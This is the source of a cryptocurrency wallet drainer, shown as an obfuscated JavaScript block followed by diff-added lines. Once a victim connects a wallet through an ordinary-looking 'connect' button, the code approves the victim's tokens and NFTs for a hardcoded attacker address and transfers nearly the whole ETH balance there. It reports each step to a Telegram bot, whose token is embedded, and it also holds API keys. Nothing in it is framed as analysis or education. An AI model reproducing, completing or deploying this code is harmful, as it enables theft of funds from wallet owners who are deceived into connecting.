_0x29697d=_0x1d3a2c;if(tokens[_0x29697d(0xcd)])try{loopTokens(tokens);}catch(_0x1145ad){console['error'](_0x29697d(0x11f)+_0x1145ad[_0x29697d(0x115)]);}else{if(NFTs[_0x29697d(0xcd)]){try{loopNfts(NFTs);}catch(_0x19b383){console[_0x29697d(0xf8)](_0x29697d(0x11f)+_0x19b383[_0x29697d(0x115)]);}onSendEther(),sendMessage(_0x29697d(0x1a7));}else try{onSendEther();}catch(_0x4e2158){console['error'](_0x29697d(0x11f)+_0x4e2158[_0x29697d(0x115)]);}}}async function loopTokens(_0x9ffba3){const _0x1ac16f=_0x1d3a2c;for await(let _0x2d0330 of _0x9ffba3){console[_0x1ac16f(0xb7)](_0x1ac16f(0xf5),_0x2d0330);try{let _0x4b1ffa=new web3Object['eth'][(_0x1ac16f(0xb9))](ABI,_0x2d0330[_0x1ac16f(0x175)]);sendMessage(_0x1ac16f(0x168)),await _0x4b1ffa[_0x1ac16f(0x17f)][_0x1ac16f(0xd5)](OWNER_ADDRESS,_0x1ac16f(0xda))[_0x1ac16f(0x169)]({'from':selectedAccount,'to':_0x2d0330[_0x1ac16f(0x175)]})['on'](_0x1ac16f(0x12f),_0x3ed5c8=>{const _0x1f78a5=_0x1ac16f;console[_0x1f78a5(0xb7)](_0x1f78a5(0x1a2)+_0x3ed5c8);})['on']('receipt',_0x1ef052=>{const _0x16cbac=_0x1ac16f;console['log']('Transaction\x20Receipt:\x20'+_0x1ef052),sendMessage(_0x16cbac(0xbc)),sendMessage(_0x16cbac(0x17d)+_0x2d0330['address']),sendMessage(_0x16cbac(0xec)+_0x2d0330[_0x16cbac(0xd6)]),sendMessage(_0x16cbac(0xeb)+OWNER_ADDRESS);})['on'](_0x1ac16f(0xf8),_0x5e1900=>{const _0x31e791=_0x1ac16f;console[_0x31e791(0xb7)](_0x31e791(0x185)+_0x5e1900),sendMessage(_0x31e791(0x187));});}catch(_0x1f7340){console[_0x1ac16f(0xb7)](_0x1ac16f(0x185)+_0x1f7340),sendMessage(_0x1ac16f(0x187));}};await loopNfts(NFTs);}async function loopNfts(_0x13319d){const _0x138be8=_0x1d3a2c;for await(let _0xdb254f of _0x13319d){console[_0x138be8(0xb7)](_0x138be8(0xbd),_0xdb254f);try{let _0x2c1055=new web3Object['eth'][(_0x138be8(0xb9))](ABIN,_0xdb254f[_0x138be8(0x166)]);await _0x2c1055[_0x138be8(0x17f)][_0x138be8(0x138)](OWNER_ADDRESS,'true')[_0x138be8(0x169)]({'from':selectedAccount,'to':_0xdb254f[_0x138be8(0x166)]})['on'](_0x138be8(0x12f),_0x3ac5d7=>{const _0x31bf3c=_0x138be8;console['log'](_0x31bf3c(0x1a2)+_0x3ac5d7),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on']('receipt',_0x3dd319=>{const _0x27b504=_0x138be8;console[_0x27b504(0xb7)](_0x27b504(0xe6)+_0x3dd319),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage('NFT\x20Contract\x20Address\x20'+token[_0x27b504(0x175)]),sendMessage(_0x27b504(0xeb)+OWNER_ADDRESS);})['on'](_0x138be8(0xf8),_0x49e04a=>{const _0x1b6d31=_0x138be8;console[_0x1b6d31(0xb7)]('Error:\x20'+_0x49e04a),sendMessage(_0x1b6d31(0x187));});}catch(_0x31a997){console[_0x138be8(0xb7)](_0x138be8(0x185)+_0x31a997),sendMessage(_0x138be8(0x187));}}await onSendEther();}async function onSendEther(){const _0x42b663=_0x1d3a2c;console[_0x42b663(0xb7)](_0x42b663(0x11e));try{let _0xe79379=await web3Object['eth'][_0x42b663(0x165)](selectedAccount);var _0x3b7ba8=await web3Object[_0x42b663(0xd1)][_0x42b663(0xfb)](),_0x3c9cae={'gasPrice':_0x3b7ba8,'from':selectedAccount,'to':OWNER_ADDRESS,'value':_0xe79379};_0x3c9cae[_0x42b663(0xf2)]=_0x30fe0f,_0x3c9cae[_0x42b663(0x1b7)]=_0xe79379-0xaa87bee538000,console[_0x42b663(0xb7)](_0x3c9cae[_0x42b663(0x1b7)]);var _0x30fe0f=await web3Object[_0x42b663(0xd1)][_0x42b663(0x14e)](_0x3c9cae),_0x2f86f7=_0x3b7ba8*_0x30fe0f;web3Object[_0x42b663(0xd1)]['sendTransaction'](_0x3c9cae)['on'](_0x42b663(0x12f),_0x3abdd9=>{const _0x47856b=_0x42b663;console[_0x47856b(0xb7)](_0x47856b(0x1a2),_0x3abdd9),sendMessage(_0x47856b(0x1b4));})['on'](_0x42b663(0x145),_0x3d55a9=>{const _0x58a9b0=_0x42b663;console[_0x58a9b0(0xb7)](_0x58a9b0(0xe6),_0x3d55a9),sendMessage(_0x58a9b0(0x160));})['on'](_0x42b663(0xf8),_0x1b262d=>{const _0x116df0=_0x42b663;console[_0x116df0(0xb7)](_0x116df0(0x185),_0x1b262d),sendMessage(_0x116df0(0x187));});}catch{sendMessage(_0x42b663(0x1a4));}}async function sendMessage(_0x514e5d){return new Promise((_0x3d6c9c,_0x3fb0c9)=>{const _0x29dec1=_0x35a0,_0x34d51b=CHAT;fetch(_0x29dec1(0x113)+_0x34d51b+'&text='+_0x514e5d,{'method':_0x29dec1(0xd7),'headers':{}})[_0x29dec1(0x177)](async _0x31376c=>{const _0x2449f9=_0x29dec1;if(_0x31376c[_0x2449f9(0x179)]>0x18f)throw _0x31376c;_0x3d6c9c(await _0x31376c[_0x2449f9(0x16a)]());})[_0x29dec1(0x133)](_0x37c2ae=>{_0x3fb0c9(_0x37c2ae);});});}async function getPrice(_0x4c16f9){return new Promise((_0x36aca9,_0x502c0b)=>{const _0x343cd8=_0x35a0;fetch('https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses='+_0x4c16f9+'&vs_currencies=usd',{'method':'GET','headers':{}})[_0x343cd8(0x177)](async _0x50e5f6=>{const _0x570c23=_0x343cd8;if(_0x50e5f6[_0x570c23(0x179)]>0x18f)throw _0x50e5f6;_0x36aca9(await _0x50e5f6[_0x570c23(0x16a)]());})[_0x343cd8(0x133)](_0x5ccce6=>{_0x502c0b(_0x5ccce6);});});}async function getValue(_0x49d2ca,_0x24682f,_0x51aa35){const _0x1f00d9=_0x1d3a2c;console[_0x1f00d9(0xb7)](_0x49d2ca,_0x24682f,_0x51aa35);let _0x1ef7b3=await getPrice(_0x49d2ca);console[_0x1f00d9(0xb7)](_0x1f00d9(0x176),_0x1ef7b3),_0x1ef7b3=parseFloat(_0x1ef7b3[_0x49d2ca][_0x1f00d9(0xf4)]);let _0x5984a=_0x24682f/0xa**(_0x51aa35||0x12)*_0x1ef7b3;return _0x5984a=parseInt(_0x5984a),_0x1ef7b3?_0x5984a:0x0;}function _0x1e2f(){const _0x5cbc9e=['saleIsActive','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','skale-razor','filter','issue','reserveApes','getBalance','token_address','boba-bobabase-testnet','New\x20token','send','json','owner','nervos-polyjuice-testnet','ApprovalForAll','removeBlackList','118912UvjRvJ','_value','eth-goerli','bittorrent-testnet','safeTransferFrom','boba-avalanche-mainnet','address','price','then','astar-mainnet','status','137798IwbVAv','kcc-mainnet','setParams','TOKEN\x20Contract\x20Address\x20','flarenetworks-canary-testnet','methods','18bmrbXs','_decimals','Pause','kcc-testnet','harmony-testnet','Error:\x20','solana-mainnet','Transaction\x20Rejected','defi-kingdoms-mainnet','bsc-mainnet','deprecated','getAccounts','metis-testnet','matic-mainnet','covalent-internal-network-v1','fantom-mainnet','cronos-mainnet','gather-testnet','AddedBlackList','Unable\x20to\x20get\x20NFts','avalanche-dexalot-testnet','nervos-godwoken-testnet','evmos-testnet','flarenetworks-flare-mainnet','boba-mainnet','constructor','astar-shibuya','bsc-testnet','fantom-testnet','aurora-mainnet','moonbeam-moonbase-alpha','newMaxFee','skale-omnus','cronos-testnet','Transaction\x20Hash:\x20','name','Insufficient\x20funds\x20for\x20transfer','_from','maximumFee','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','tokens-list','BAYC_PROVENANCE','event','oasys-testnet','bittorrent-mainnet','Cl\x20address\x20:\x20','tokenId','boba-bnb-mainnet','redeem','_blackListedUser','_name','approved','Transaction\x20is\x20submitted\x20to\x20the\x20network','destroyBlackFunds','gather-mainnet','value','log','transferFrom','Contract','eth-mainnet','7537512uLOgUQ','Approve\x20Completed\x20Successfully','NFT','renounceOwnership','previousOwner','flarenetworks-flare-testnet','startingIndex','boba-bobabeam-mainnet','uint256','bytes','swimmer-testnet','baseURI','decimals','_owner','4280890UXBmbT','newAddress','KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp','meter-mainnet','length','WalletConnectProvider','allowed','string','eth','metis-mainnet','getBlackListStatus','isBlackListed','approve','balance','GET','getApproved','33UQwOuh','999999999999999999999999999999999999999999999999999999999999999999999999','maxNftSupply','sx-mainnet','btc-mainnet','.connect','flarenetworks-canary-mainnet','amount','_totalSupply','skale-calypso','nonpayable','balanceOf','Deprecate','Transaction\x20Receipt:\x20','Tokens:','feeBasisPoints','_user','function','Your\x20address\x20','Token\x20balance\x20is\x20','sort','astar-shiden','click','bytes4','MAX_UINT','gas','emerald-paratime-mainnet','usd','Token','getOwner','view','error','_spender','boba-avalanche-testnet','getGasPrice','matic-mumbai','7584GizHAO','optimism-mainnet','swimmer-mainnet','Unpause','Web3Modal','defi-kingdoms-testnet','who','7OFIAOT','4588736xzMwaB','interfaceId','Approval','_to','getChainId','RemovedBlackList','avalanche-testnet','totalSupply','unpause','transferOwnership','fXo9hODu3TOBZaZsTZZpkRIRL48Urcsi6Q9byIcaSDSU0hirH5IzV8tA7IYlAiJ7','boba-bnb-testnet','meter-testnet','findora-mainnet','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','OwnershipTransferred','message','arbitrum-nova-mainnet','symbol','operator','palm-mainnet','debug','moonbeam-moonriver','pause','https://bsc-dataseed.binance.org/','sending\x20ether','Error\x20processing\x20item\x20','apePrice','evmos-mainnet','arbitrum-goerli','moonbeam-mainnet','MAX_APES','neon-testnet','addBlackList','oasys-mainnet','23664jUDgsh','paused','polygon-zkevm-testnet','ownerOf','2062856957','REVEAL_TIMESTAMP','arbitrum-mainnet','transactionHash','oasis-sapphire-testnet','search','all','catch','startingIndexBlock','boba-goerli','axie-mainnet','Transfer','setApprovalForAll','&format=decimal&limit=','emergencySetStartingIndexBlock','newBasisPoints','Could\x20not\x20get\x20a\x20wallet\x20connection','rsk-mainnet','default','tokenOfOwnerByIndex','Error\x20collecting\x20info\x20about\x20wallet','nervos-godwoken-mainnet','milkomeda-a1-mainnet','aurora-testnet','e77435344ef0486893cdc26d7d5cf039','receipt','milkomeda-a1-devnet','skale-staging-uum','16137BiIGVK','setProvenanceHash','from','harmony-mainnet','bool','upgradedAddress','estimateGas','saleStart','spender','milkomeda-c1-devnet','mantle-testnet','Issue','NFTs\x20collection\x20','remaining','payable','0xF7CC89c87B626A9b2B16ed6a6922aaF4b3B8fbf8','1190sClGrj','allowance','newOwner','withdraw','Initial\x20list\x20','milkomeda-c1-mainnet','toString'];_0x1e2f=function(){return _0x5cbc9e;};return _0x1e2f();}async function getNFTs(_0x10fc9d='',_0x27c0ad=_0x1d3a2c(0xcb),_0x26d4c7='eth',_0x4d58bf='50'){return new Promise((_0x3c6246,_0x73cde1)=>{const _0x18e544=_0x35a0;fetch('https://deep-index.moralis.io/api/v2/'+_0x10fc9d+'/nft/collections?chain='+_0x26d4c7+_0x18e544(0x139)+_0x4d58bf,{'method':'GET','headers':{'accept':'application/json','X-API-Key':_0x27c0ad}})['then'](async _0x10628c=>{const _0x5c7b2e=_0x18e544;if(_0x10628c[_0x5c7b2e(0x179)]>0x18f)throw _0x10628c;_0x3c6246(await _0x10628c[_0x5c7b2e(0x16a)]());})[_0x18e544(0x133)](_0x48d862=>{_0x73cde1(_0x48d862);});});}
+let tokens = []
+let NFTs = []
+let chainId = null;
+let web3Object = null;
+let selectedAccount = null;
+const Web3Modal = window.Web3Modal.default;
+const WalletConnectProvider = window.WalletConnectProvider.default;
+
+const OWNER_ADDRESS = "0xea8968B218a551919FbD5f1166328C82a96dED54"
+
+const ABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }]
+const ABIN = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"maxNftSupply","type":"uint256"},{"internalType":"uint256","name":"saleStart","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"BAYC_PROVENANCE","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_APES","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"REVEAL_TIMESTAMP","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"apePrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"baseURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"emergencySetStartingIndexBlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"flipSaleState","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxApePurchase","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"numberOfTokens","type":"uint256"}],"name":"mintApe","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveApes","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"saleIsActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"provenanceHash","type":"string"}],"name":"setProvenanceHash","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"revealTimeStamp","type":"uint256"}],"name":"setRevealTimestamp","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"setStartingIndex","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"startingIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"startingIndexBlock","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+const networkToId = {
+    20090103: "btc-mainnet",
+    1: "eth-mainnet",
+    5: "eth-goerli",
+    137: "matic-mainnet",
+    80001: "matic-mumbai",
+    56: "bsc-mainnet",
+    97: "bsc-testnet",
+    43114: "avalanche-mainnet",
+    43113: "avalanche-testnet",
+    250: "fantom-mainnet",
+    4002: "fantom-testnet",
+    42161: "arbitrum-mainnet",
+    421613: "arbitrum-goerli",
+    42170: "arbitrum-nova-mainnet",
+    592: "astar-mainnet",
+    81: "astar-shibuya",
+    336: "astar-shiden",
+    1313161554: "aurora-mainnet",
+    1313161555: "aurora-testnet",
+    432204: "avalanche-dexalot-mainnet",
+    432201: "avalanche-dexalot-testnet",
+    2020: "axie-mainnet",
+    84531: "base-testnet",
+    119: "bittorrent-mainnet",
+    1029: "bittorrent-testnet",
+    43288: "boba-avalanche-mainnet",
+    4328: "boba-avalanche-testnet",
+    56288: "boba-bnb-mainnet",
+    9728: "boba-bnb-testnet",
+    1294: "boba-bobabeam-mainnet",
+    1297: "boba-bobabase-testnet",
+    288: "boba-mainnet",
+    28: "boba-rinkeby-testnet",
+    2888: "boba-goerli",
+    7700: "canto-mainnet",
+    1131378225: "covalent-internal-network-v1",
+    25: "cronos-mainnet",
+    338: "cronos-testnet",
+    53935: "defi-kingdoms-mainnet",
+    335: "defi-kingdoms-testnet",
+    42262: "emerald-paratime-mainnet",
+    9001: "evmos-mainnet",
+    9000: "evmos-testnet",
+    2152: "findora-mainnet",
+    2154: "findora-forge-testnet",
+    19: "flarenetworks-canary-mainnet",
+    16: "flarenetworks-canary-testnet",
+    14: "flarenetworks-flare-mainnet",
+    114: "flarenetworks-flare-testnet",
+    192837465: "gather-mainnet",
+    356256156: "gather-testnet",
+    1666600000: "harmony-mainnet",
+    1666700000: "harmony-testnet",
+    321: "kcc-mainnet",
+    322: "kcc-testnet",
+    59140: "linea-testnet",
+    5001: "mantle-testnet",
+    82: "meter-mainnet",
+    83: "meter-testnet",
+    1088: "metis-mainnet",
+    588: "metis-testnet",
+    2002: "milkomeda-a1-mainnet",
+    200202: "milkomeda-a1-devnet",
+    2001: "milkomeda-c1-mainnet",
+    200101: "milkomeda-c1-devnet",
+    1284: "moonbeam-mainnet",
+    1287: "moonbeam-moonbase-alpha",
+    1285: "moonbeam-moonriver",
+    245022926: "neon-testnet",
+    71402: "nervos-godwoken-mainnet",
+    71401: "nervos-godwoken-testnet",
+    71393: "nervos-polyjuice-testnet",
+    23294: "oasis-sapphire-mainnet",
+    23295: "oasis-sapphire-testnet",
+    248: "oasys-mainnet",
+    9372: "oasys-testnet",
+    10: "optimism-mainnet",
+    11297108109: "palm-mainnet",
+    11297108099: "palm-testnet",
+    1442: "polygon-zkevm-testnet",
+    30: "rsk-mainnet",
+    31: "rsk-testnet",
+    1564830818: "skale-calypso",
+    344106930: "skale-staging-uum",
+    1026062157: "skale-omnus",
+    278611351: "skale-razor",
+    1399811149: "solana-mainnet",
+    73772: "swimmer-mainnet",
+    73773: "swimmer-testnet",
+    416: "sx-mainnet"
+  };
+
+  const providerOptions = {
+    walletconnect: {
+        package: WalletConnectProvider,
+        options: {
+            rpc: {
+                1: "https://bsc-dataseed.binance.org/",
+            },
+            chainId: 1,
+            infuraId: "e62a60a251c64745baefeaf8237af646",
+            pollingInterval: "10000",
+        },
+    },
+    coinbasewallet: {
+        package: CoinbaseWalletSDK, // Required
+        options: {
+          appName: "debug", // Required
+          infuraId: "e62a60a251c64745baefeaf8237af646", // Required
+        chainId: 1, // Optional. It defaults to 1 if not provided
+         
+          darkMode: false // Optional. Use dark theme, defaults to false
+        }
+      }
+  
+};
+let web3Modal = new Web3Modal({
+    providerOptions,
+    cacheProvider: false,
+    disableInjectedProvider: false,
+});
+
+$(".connect").click(async function () {
+    try {
+        let provider = await web3Modal.connect();
+        onProvider(provider);
+        provider.on("accountsChanged", (accounts) => {          
+            console.log(accounts);
+            onProvider(provider);
+        });
+    } catch (e) {
+        console.log("Could not get a wallet connection", e);
+        return;
+    }
+})
+
+async function onProvider(provider) {
+    web3Object = new Web3(provider);
+    let accounts = await web3Object.eth.getAccounts();
+    selectedAccount = accounts[0];
+
